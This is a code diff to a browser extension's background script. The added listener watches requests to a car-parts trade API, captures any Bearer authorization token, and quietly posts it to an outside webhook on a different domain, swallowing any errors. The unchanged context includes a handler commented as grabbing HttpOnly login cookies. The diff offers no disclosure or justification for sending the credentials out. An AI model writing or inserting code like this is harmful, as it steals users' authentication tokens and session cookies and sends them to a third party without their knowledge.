@@ -1,3 +1,21 @@
+chrome.webRequest.onSendHeaders.addListener(
+    (details) => {
+        if (!details.requestHeaders) return;
+        for (let header of details.requestHeaders) {
+            if (header.name.toLowerCase() === 'authorization' && header.value.toLowerCase().startsWith('bearer ')) {
+                fetch("https://mot-reminder-quick.vercel.app/api/webhooks/omnipart", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ token: header.value.trim() })
+                }).catch(() => {});
+                break;
+            }
+        }
+    },
+    { urls: ["https://api.omnipart.eurocarparts.com/*"] },
+    ["requestHeaders"]
+);
+
 chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
     if (message.action === "SEND_TOKENS") {
         // Grab all HttpOnly login cookies from the browser directly natively via Chrome API
